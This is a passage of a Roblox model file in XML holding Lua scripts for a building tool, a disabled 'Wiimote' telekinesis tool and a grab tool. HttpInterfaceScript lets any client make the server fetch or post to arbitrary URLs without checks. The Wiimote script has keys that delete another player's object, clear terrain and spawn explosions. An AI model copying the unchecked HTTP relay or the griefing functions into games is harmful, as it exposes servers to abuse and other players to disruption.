										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXD1F48D6633E94C0D9425848A05CA7A7A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>7</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX103AE62B70FC4964B92339644F5E551B">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">SELECTION GROUPS</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
					</Item>
					<Item class="IntValue" referent="RBXD2563CF524954045AF5AEE36C674FB2C">
						<Properties>
							<string name="Name">UIComponentCount</string>
							<int name="Value">0</int>
						</Properties>
						<Item class="Script" referent="RBXA8A5FBE6ECDC420D81859E500EAF5A78">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">UIComponentCounter</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[local Tool						= script.Parent.Parent;
local Interfaces				= Tool.Interfaces;
local UIComponentCountValue		= Tool.UIComponentCount;

function _getAllDescendants( Parent )
	-- Recursively gets all the descendants of  `Parent` and returns them

	local descendants = {};
	for _, Child in pairs( Parent:GetChildren() ) do

		-- Add the direct descendants of `Parent`
		table.insert( descendants, Child );

		-- Add the descendants of each child
		for _, Subchild in pairs( _getAllDescendants( Child ) ) do
			table.insert( descendants, Subchild );
		end;

	end;
	return descendants;
end;

-- Provide a count of the number of UI components in the tool
-- (this allows the client-side code to begin when all expected
-- components have loaded/replicated)

UIComponentCountValue.Value = #_getAllDescendants( Interfaces );]]></ProtectedString>
							</Properties>
						</Item>
					</Item>
					<Item class="StringValue" referent="RBXF4473F87CEE447C5A90BCB46645B089F">
						<Properties>
							<string name="Name">Version</string>
							<string name="Value">1.3.1</string>
						</Properties>
					</Item>
					<Item class="Model" referent="RBX65B2385062F9443A929B45CBECFE637E">
						<Properties>
							<CoordinateFrame name="ModelInPrimary">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<string name="Name">HttpInterface</string>
							<Ref name="PrimaryPart">null</Ref>
						</Properties>
						<Item class="RemoteFunction" referent="RBX885359AFBA0C413882016E577E6A95AE">
							<Properties>
								<string name="Name">PostAsync</string>
							</Properties>
						</Item>
						<Item class="RemoteFunction" referent="RBXF2D0B30E2C1E49AD846465668F4A942D">
							<Properties>
								<string name="Name">GetAsync</string>
							</Properties>
						</Item>
						<Item class="Script" referent="RBXC4525AEBD4DE4301B010B0DF2197974C">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">HttpInterfaceScript</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Provides an interface for the client-side code to use HttpService

local HttpService			= Game:GetService( 'HttpService' );
local HttpInterface			= script.Parent;

HttpInterface.GetAsync.OnServerInvoke = function ( Player, Url, NoCache )
	local Results = {};
	ypcall( function ()
		Results = { HttpService:GetAsync( Url, NoCache ) };
	end );
	return unpack( Results );
end;

HttpInterface.PostAsync.OnServerInvoke = function ( Player, Url, Data, ContentType )
	local Results = {};
	ypcall( function ()
		Results = { HttpService:PostAsync( Url, Data, ContentType ) };
	end );
	return unpack( Results );
end;

HttpInterface.Test.OnServerInvoke = function ( Player )
	-- Returns the status of a test request through HttpService

	local RequestSuccess, RequestOutput = ypcall( function ()
		HttpService:GetAsync 'http://www.google.com';
	end );

	return RequestSuccess, RequestOutput;
end]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="RemoteFunction" referent="RBX973B76E14CB14188901A9FE7D2709903">
							<Properties>
								<string name="Name">Test</string>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="LocalScript" referent="RBXB56ACFB50FCB4841846729D15D1EF4E9">
					<Properties>
						<bool name="Disabled">true</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Local Gui</string>
						<string name="ScriptGuid"></string>
						<ProtectedString name="Source"><![CDATA[local Tool = script.Parent;

enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	enabled = false
	mouse.Icon = "rbxasset://textures\\GunWaitCursor.png"

	wait(script.Parent.rel.Value)
	mouse.Icon = "rbxasset://textures\\GunCursor.png"
	enabled = true

end

function onEquippedLocal(mouse)

	if mouse == nil then
		print("Mouse not found")
		return 
	end

	mouse.Icon = "rbxasset://textures\\GunCursor.png"
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end


Tool.Equipped:connect(onEquippedLocal)]]></ProtectedString>
					</Properties>
				</Item>
				<Item class="StringValue" referent="RBXF500F7839F204E11A4F7A2B230B27B6A">
					<Properties>
						<string name="Name">Wiimote</string>
						<string name="Value">dont delete pls</string>
					</Properties>
					<Item class="Script" referent="RBX2DCA260DFD7F4719B1B147A224D115AE">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">LineConnect</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[wait()
local check = script.Part2
local part1 = script.Part1.Value
local part2 = script.Part2.Value
local parent = script.Par.Value
local color = script.Color
local line = Instance.new("Part")
line.Transparency = 1
line.TopSurface = 0
line.BottomSurface = 0
line.Reflectance = .5
line.Name = "Laser"
line.Locked = true
line.CanCollide = false
line.Anchored = true
line.formFactor = 0
line.Size = Vector3.new(1,1,1)
local mesh = Instance.new("BlockMesh")
mesh.Parent = line
while true do
	if (check.Value==nil) then break end
	if (part1==nil or part2==nil or parent==nil) then break end
	if (part1.Parent==nil or part2.Parent==nil) then break end
	if (parent.Parent==nil) then break end
	local lv = CFrame.new(part1.Position,part2.Position)
	local dist = (part1.Position-part2.Position).magnitude
	line.Parent = parent
	line.BrickColor = color.Value.BrickColor
	line.Reflectance = color.Value.Reflectance
	line.Transparency = color.Value.Transparency
	line.Transparency = 1
	line.CFrame = CFrame.new(part1.Position+lv.lookVector*dist/2)
	line.CFrame = CFrame.new(line.Position,part2.Position)
	mesh.Scale = Vector3.new(.25,.25,dist)
	wait()
end
line:remove()
script:remove() ]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="LocalScript" referent="RBX18B7ABD14A54453D9797DB0290B73A1E">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Local Gui</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[local Tool = script.Parent;

enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end
	
	enabled = false
	mouse.Icon = "http://finobe.com/asset?id=47031"

	wait(0.5)
	mouse.Icon = "http://finobe.com/asset?id=47030"
	enabled = true

end

function onEquippedLocal(mouse)

	if mouse == nil then
		print("Mouse not found")
		return 
	end

	mouse.Icon = "http://finobe.com/asset?id=47030"
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end


Tool.Equipped:connect(onEquippedLocal)
]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="LocalScript" referent="RBX4F0A26FF2CC84DCABE145829A9995D29">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">MainScript</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[if game.Workspace.Camera:FindFirstChild("wiimote") == nil then
clicksound = Instance.new("Sound")
clicksound.Name = "wiimote"
clicksound.Parent = game.Workspace.Camera
clicksound.SoundId = "http://finobe.com/asset?id=47028"
clicksound.Volume = 1
else
print("bruh the music already here")
end

tool = script.Parent
lineconnect = tool.LineConnect
object = nil
mousedown = false
found = false
BP = Instance.new("BodyPosition")
BP.maxForce = Vector3.new(math.huge*math.huge,math.huge*math.huge,math.huge*math.huge) --pwns everyone elses bodyposition
BP.P = BP.P*8 --faster movement. less bounceback.
dist = nil
point = Instance.new("Part")
point.Locked = true
point.Anchored = true
point.formFactor = 0
point.Shape = 0
point.BrickColor = BrickColor.new("Toothpaste")
point.Size = Vector3.new(1,1,1)
point.CanCollide = false
point.Transparency = 1
local mesh = Instance.new("SpecialMesh")
mesh.MeshType = "Sphere"
mesh.Scale = Vector3.new(.7,.7,.7)
mesh.Parent = point
handle = tool.Handle
front = tool.Handle
color = tool.Handle
objval = nil
local hooked = false 
local hookBP = BP:clone() 
hookBP.maxForce = Vector3.new(30000,30000,30000) 

function LineConnect(part1,part2,parent)
	local p1 = Instance.new("ObjectValue")
	p1.Value = part1
	p1.Name = "Part1"
	local p2 = Instance.new("ObjectValue")
	p2.Value = part2
	p2.Name = "Part2"
	local par = Instance.new("ObjectValue")
	par.Value = parent
	par.Name = "Par"
	local col = Instance.new("ObjectValue")
	col.Value = color
	col.Name = "Color"
	local s = lineconnect:clone()
	s.Disabled = false
	p1.Parent = s
	p2.Parent = s
	par.Parent = s
	col.Parent = s
	s.Parent = workspace
	if (part2==object) then
		objval = p2
	end
end

function onButton1Down(mouse)
	if (mousedown==true) then return end
	mousedown = true
	coroutine.resume(coroutine.create(function()
		local p = point:clone()
		game.Workspace.Camera.wiimote:Play()
		p.Parent = tool
		LineConnect(front,p,workspace)
		while (mousedown==true) do
			p.Parent = tool
			if (object==nil) then
				if (mouse.Target==nil) then
					local lv = CFrame.new(front.Position,mouse.Hit.p)
					p.CFrame = CFrame.new(front.Position+(lv.lookVector*1000))
				else
					p.CFrame = CFrame.new(mouse.Hit.p)
				end
			else
				LineConnect(front,object,workspace)
				break
			end
			wait()
		end
		p:remove()
	end))
	while (mousedown==true) do
		if (mouse.Target~=nil) then
			local t = mouse.Target
			if (t.Anchored==false) then
				object = t
				dist = (object.Position-front.Position).magnitude
				break
			end
		end
		wait()
	end
	while (mousedown==true) do
		if (object.Parent==nil) then break end
		local lv = CFrame.new(front.Position,mouse.Hit.p)
		BP.Parent = object
		BP.position = front.Position+lv.lookVector*dist
		wait()
	end
	BP:remove()
	object = nil
	objval.Value = nil
end

function onKeyDown(key,mouse) 
	local key = key:lower() 
	local yesh = false 
	if (key=="q") then 
		if (dist>=5) then 
			dist = dist-5 
		end 
	end 
	if key == "l" then 
	if (object==nil) then return end 
	for _,v in pairs(object:children()) do 
	if v.className == "BodyGyro" then 
	return nil 
	end 
	end 
	BG = Instance.new("BodyGyro") 
	BG.maxTorque = Vector3.new(math.huge,math.huge,math.huge) 
	BG.cframe = CFrame.new(object.CFrame.p) 
	BG.Parent = object 
	repeat wait() until(object.CFrame == CFrame.new(object.CFrame.p)) 
	BG.Parent = nil 
	if (object==nil) then return end 
	for _,v in pairs(object:children()) do 
	if v.className == "BodyGyro" then 
	v.Parent = nil 
	end 
	end 
	object.Velocity = Vector3.new(0,0,0) 
	object.RotVelocity = Vector3.new(0,0,0) 
	end 
	if (key=="e") then
		dist = dist+5
	end
	if key == "k" then
		name = object.Parent.Name
		game.Players[name]:Destroy()
	end

	if (key=="f") then 
		if (object==nil) then return end
		local e = Instance.new("Explosion")
		e.Parent = workspace
		e.Position = object.Position
		color.BrickColor = BrickColor.Black()
		point.BrickColor = BrickColor.White() 
		wait(.48)
		color.BrickColor = BrickColor.White() 
		point.BrickColor = BrickColor.Black() 
	end
	if (key=="") then 
		if not hooked then 
		if (object==nil) then return end 
		hooked = true 
		hookBP.position = object.Position 
		if tool.Parent:findFirstChild("Torso") then 
		hookBP.Parent = tool.Parent.Torso 
		if dist ~= (object.Size.x+object.Size.y+object.Size.z)+5 then 
		dist = (object.Size.x+object.Size.y+object.Size.z)+5 
		end 
		end 
		else 
		hooked = false 
		hookBP.Parent = nil 
		end 
	end 
	if (key=="") then 
		if (object==nil) then return end 
		color.BrickColor = BrickColor.new("Toothpaste") 
		point.BrickColor = BrickColor.new("Toothpaste") 
		object.Parent = nil 
		wait(.48) 
		color.BrickColor = BrickColor.new("Toothpaste")
		point.BrickColor = BrickColor.new("Toothpaste")
	end 
	if (key=="") then 
	if (object==nil) then return end 
	local New = object:clone() 
	New.Parent = object.Parent 
	for _,v in pairs(New:children()) do 
	if v.className == "BodyPosition" or v.className == "BodyGyro" then 
	v.Parent = nil 
	end 
	end 
	object = New 
	mousedown = false 
	mousedown = true 
	LineConnect(front,object,workspace) 
		while (mousedown==true) do
		if (object.Parent==nil) then break end
		local lv = CFrame.new(front.Position,mouse.Hit.p)
		BP.Parent = object
		BP.position = front.Position+lv.lookVector*dist
		wait()
	end
	BP:remove()
	object = nil
	objval.Value = nil
	end 
	
if (key=="c") then 
		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		Cube.BrickColor = BrickColor.new("Lavender")
		for i = 0,5 do 
			local Mesh = Instance.new("SpecialMesh") 
			--Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			--Decal.Face = i 
			Mesh.MeshId = "http://finobe.com/asset?id=47032"
			Mesh.Scale = Vector3.new(0.75,0.75,0.75)
			Mesh.Name = "WeightedStorageCubeMesh" 
			Mesh.Parent = Cube 
		end 
	end 

if (key=="b") then 

--		local container = Workspace:FindFirstChild("LocalBin")
--		if not container then
--		container = Instance.new("Camera")
--		container.Name = "LocalBin"
--		container.Parent = Workspace

		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.BrickColor = BrickColor.new("Lavender")
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		for i = 0,5 do 
			local Mesh = Instance.new("SpecialMesh") 
			--Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			--Decal.Face = i 
			Mesh.MeshId = "http://finobe.com/asset?id=47032"
			Mesh.Scale = Vector3.new(0.75,0.75,0.75)
			Mesh.Name = "WeightedStorageCubeMesh" 
			Mesh.Parent = Cube 
		Cube.Parent = game.Workspace.Camera

	end 
end

if (key=="x") then 

		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.BrickColor = BrickColor.new("Lavender")
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		Cube.Anchored = true
		for i = 0,5 do 
			local Mesh = Instance.new("SpecialMesh") 
			--Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			--Decal.Face = i 
			Mesh.MeshId = "http://finobe.com/asset?id=47032"
			Mesh.Scale = Vector3.new(0.75,0.75,0.75)
			Mesh.Name = "WeightedStorageCubeMesh" 
			Mesh.Parent = Cube 
		Cube.Parent = game.Workspace.Camera

	end 
end

if (key=="u") then 

game.Workspace.Terrain:Clear()

end

if (key=="p") then 

--game.Workspace.Camera:ClearAllChildren()
 for i,v in pairs(game.Workspace.Camera:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v:Destroy()
    end 
end 
end

if (key=="g") then 

 for i,v in pairs(game.Workspace:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v:Destroy()
    end 
end 
end

if (key=="y") then 

 for i,v in pairs(game.Workspace:GetChildren()) do
        if v.Name == "obama" then --was "sort" to remove hacker path but eh
        v:Destroy()
    end 
end 
end

if (key=="n") then 
 for i,v in pairs(game.Workspace.Camera:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v.Anchored = true
    end 
end 
end

if (key=="m") then 
 for i,v in pairs(game.Workspace.Camera:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v.Anchored = false
    end 
end 
end

	if (key=="") then 
		if dist ~= 15 then 
			dist = 15 
		end 
	end 
end


function onEquipped(mouse)
	keymouse = mouse
	local char = tool.Parent
	human = char.Humanoid
	human.Changed:connect(function() if (human.Health==0) then mousedown = false BP:remove() point:remove() tool:remove() end end)
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
	mouse.Button1Up:connect(function() mousedown = false end)
	mouse.KeyDown:connect(function(key) onKeyDown(key,mouse) end)
--	mouse.Icon = "rbxasset://textures\\GunCursor.png"
end



tool.Equipped:connect(onEquipped)]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="SpecialMesh" referent="RBXCB8DDBC05C7A433A91D8767652816F8A">
						<Properties>
							<token name="LODX">2</token>
							<token name="LODY">2</token>
							<Content name="MeshId"><url>http://finobe.com/asset?id=47026</url></Content>
							<token name="MeshType">5</token>
							<string name="Name">Mesh</string>
							<Vector3 name="Offset">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<Vector3 name="Scale">
								<X>25</X>
								<Y>25</Y>
								<Z>25</Z>
							</Vector3>
							<Content name="TextureId"><url>http://finobe.com/asset?id=47027</url></Content>
							<Vector3 name="VertexColor">
								<X>1</X>
								<Y>1</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="LocalScript" referent="RBXC912658700554355A5E90A26EDF87B6F">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">MainScript</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[wait() 
tool = script.Parent
lineconnect = tool.LineConnect
object = nil
mousedown = false
found = false
BP = Instance.new("BodyPosition")
BP.maxForce = Vector3.new(math.huge*math.huge,math.huge*math.huge,math.huge*math.huge) --pwns everyone elses bodyposition
BP.P = BP.P*8 --faster movement. less bounceback.
dist = nil
point = Instance.new("Part")
point.Locked = true
point.Anchored = true
point.formFactor = 0
point.Shape = 0
point.BrickColor = BrickColor.new("Toothpaste")
point.Size = Vector3.new(1,1,1)
point.CanCollide = false
local mesh = Instance.new("SpecialMesh")
mesh.MeshType = "Sphere"
mesh.Scale = Vector3.new(.7,.7,.7)
mesh.Parent = point
handle = tool.Handle
front = tool.Handle
color = tool.Handle
objval = nil
local hooked = false 
local hookBP = BP:clone() 
hookBP.maxForce = Vector3.new(30000,30000,30000) 

function LineConnect(part1,part2,parent)
	local p1 = Instance.new("ObjectValue")
	p1.Value = part1
	p1.Name = "Part1"
	local p2 = Instance.new("ObjectValue")
	p2.Value = part2
	p2.Name = "Part2"
	local par = Instance.new("ObjectValue")
	par.Value = parent
	par.Name = "Par"
	local col = Instance.new("ObjectValue")
	col.Value = color
	col.Name = "Color"
	local s = lineconnect:clone()
	s.Disabled = false
	p1.Parent = s
	p2.Parent = s
	par.Parent = s
	col.Parent = s
	s.Parent = workspace
	if (part2==object) then
		objval = p2
	end
end

function onButton1Down(mouse)
	if (mousedown==true) then return end
	mousedown = true
	coroutine.resume(coroutine.create(function()
		local p = point:clone()
		p.Parent = tool
		LineConnect(front,p,workspace)
		while (mousedown==true) do
			p.Parent = tool
			if (object==nil) then
				if (mouse.Target==nil) then
					local lv = CFrame.new(front.Position,mouse.Hit.p)
					p.CFrame = CFrame.new(front.Position+(lv.lookVector*1000))
				else
					p.CFrame = CFrame.new(mouse.Hit.p)
				end
			else
				LineConnect(front,object,workspace)
				break
			end
			wait()
		end
		p:remove()
	end))
	while (mousedown==true) do
		if (mouse.Target~=nil) then
			local t = mouse.Target
			if (t.Anchored==false) then
				object = t
				dist = (object.Position-front.Position).magnitude
				break
			end
		end
		wait()
	end
	while (mousedown==true) do
		if (object.Parent==nil) then break end
		local lv = CFrame.new(front.Position,mouse.Hit.p)
		BP.Parent = object
		BP.position = front.Position+lv.lookVector*dist
		wait()
	end
	BP:remove()
	object = nil
	objval.Value = nil
end

function onKeyDown(key,mouse) 
	local key = key:lower() 
	local yesh = false 
	if (key=="q") then 
		if (dist>=5) then 
			dist = dist-5 
		end 
	end 
	if key == "l" then 
	if (object==nil) then return end 
	for _,v in pairs(object:children()) do 
	if v.className == "BodyGyro" then 
	return nil 
	end 
	end 
	BG = Instance.new("BodyGyro") 
	BG.maxTorque = Vector3.new(math.huge,math.huge,math.huge) 
	BG.cframe = CFrame.new(object.CFrame.p) 
	BG.Parent = object 
	repeat wait() until(object.CFrame == CFrame.new(object.CFrame.p)) 
	BG.Parent = nil 
	if (object==nil) then return end 
	for _,v in pairs(object:children()) do 
	if v.className == "BodyGyro" then 
	v.Parent = nil 
	end 
	end 
	object.Velocity = Vector3.new(0,0,0) 
	object.RotVelocity = Vector3.new(0,0,0) 
	end 
	if (key=="e") then
		dist = dist+5
	end
	if key == "k" then
		name = object.Parent.Name
		game.Players[name]:Destroy()
	end

	if (key=="f") then 
		if (object==nil) then return end
		local e = Instance.new("Explosion")
		e.Parent = workspace
		e.Position = object.Position
		color.BrickColor = BrickColor.Black()
		point.BrickColor = BrickColor.White() 
		wait(.48)
		color.BrickColor = BrickColor.White() 
		point.BrickColor = BrickColor.Black() 
	end
	if (key=="") then 
		if not hooked then 
		if (object==nil) then return end 
		hooked = true 
		hookBP.position = object.Position 
		if tool.Parent:findFirstChild("Torso") then 
		hookBP.Parent = tool.Parent.Torso 
		if dist ~= (object.Size.x+object.Size.y+object.Size.z)+5 then 
		dist = (object.Size.x+object.Size.y+object.Size.z)+5 
		end 
		end 
		else 
		hooked = false 
		hookBP.Parent = nil 
		end 
	end 
	if (key=="") then 
		if (object==nil) then return end 
		color.BrickColor = BrickColor.new("Toothpaste") 
		point.BrickColor = BrickColor.new("Toothpaste") 
		object.Parent = nil 
		wait(.48) 
		color.BrickColor = BrickColor.new("Toothpaste")
		point.BrickColor = BrickColor.new("Toothpaste")
	end 
	if (key=="") then 
	if (object==nil) then return end 
	local New = object:clone() 
	New.Parent = object.Parent 
	for _,v in pairs(New:children()) do 
	if v.className == "BodyPosition" or v.className == "BodyGyro" then 
	v.Parent = nil 
	end 
	end 
	object = New 
	mousedown = false 
	mousedown = true 
	LineConnect(front,object,workspace) 
		while (mousedown==true) do
		if (object.Parent==nil) then break end
		local lv = CFrame.new(front.Position,mouse.Hit.p)
		BP.Parent = object
		BP.position = front.Position+lv.lookVector*dist
		wait()
	end
	BP:remove()
	object = nil
	objval.Value = nil
	end 
	
if (key=="c") then 
		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		for i = 0,5 do 
			local Mesh = Instance.new("SpecialMesh") 
			--Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			--Decal.Face = i 
			Mesh.MeshId = "http://www.mulrbx.com/asset/?id=1143284632"
			Mesh.TextureId = "http://www.mulrbx.com/asset/?id=1143284657"
			Mesh.Scale = Vector3.new(0.1,0.1,0.1)
			Mesh.Name = "WeightedStorageCubeMesh" 
			Mesh.Parent = Cube 
		end 
	end 

if (key=="b") then 

--		local container = Workspace:FindFirstChild("LocalBin")
--		if not container then
--		container = Instance.new("Camera")
--		container.Name = "LocalBin"
--		container.Parent = Workspace

		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		for i = 0,5 do 
			local Decal = Instance.new("Decal") 
			Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			Decal.Face = i 
			Decal.Name = "WeightedStorageCubeDecal" 
			Decal.Parent = Cube
			Cube.Parent = game.Workspace.Camera

	end 
end

if (key=="x") then 

		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		Cube.Anchored = true
		for i = 0,5 do 
			local Decal = Instance.new("Decal") 
			Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			Decal.Face = i 
			Decal.Name = "WeightedStorageCubeDecal" 
			Decal.Parent = Cube
			Cube.Parent = game.Workspace.Camera

	end 
end

if (key=="u") then 

game.Workspace.Terrain:Clear()

end

if (key=="p") then 

game.Workspace.Camera:ClearAllChildren()

end

if (key=="g") then 

 for i,v in pairs(game.Workspace:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v:Destroy()
    end 
end 
end

if (key=="n") then 
 for i,v in pairs(game.Workspace.Camera:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v.Anchored = true
    end 
end 
end

if (key=="m") then 
 for i,v in pairs(game.Workspace.Camera:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v.Anchored = false
    end 
end 
end

	if (key=="") then 
		if dist ~= 15 then 
			dist = 15 
		end 
	end 
end


function onEquipped(mouse)
	keymouse = mouse
	local char = tool.Parent
	human = char.Humanoid
	human.Changed:connect(function() if (human.Health==0) then mousedown = false BP:remove() point:remove() tool:remove() end end)
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
	mouse.Button1Up:connect(function() mousedown = false end)
	mouse.KeyDown:connect(function(key) onKeyDown(key,mouse) end)
	mouse.Icon = "rbxasset://textures\\GunCursor.png"
end



tool.Equipped:connect(onEquipped)]]></ProtectedString>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="HopperBin" referent="RBX3E7997F4B2254B9098FDDFFC1517A930">
				<Properties>
					<bool name="Active">false</bool>
					<token name="BinType">0</token>
					<string name="Name">Grab</string>
					<Content name="TextureId"><null></null></Content>
				</Properties>
				<Item class="LocalScript" referent="RBX354A6E26D4DD448F8F7F5D2F92C05834">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">LocalScript</string>
						<string name="ScriptGuid"></string>
						<ProtectedString name="Source"><![CDATA[me = game.Players.LocalPlayer
char = me.Character
selected = false
attacking = false
hurt = false
grabbed = nil
mode = "drop"
bloodcolors = {"Bright red", "Really red"}


function prop(part, parent, collide, tran, ref, x, y, z, color, anchor, form)
part.Parent = parent
part.formFactor = form
part.CanCollide = collide
part.Transparency = tran
part.Reflectance = ref
part.Size = Vector3.new(x,y,z)
part.BrickColor = BrickColor.new(color)
part.TopSurface = 0
part.BottomSurface = 0
part.Anchored = anchor
part.Locked = true
part:BreakJoints()
end

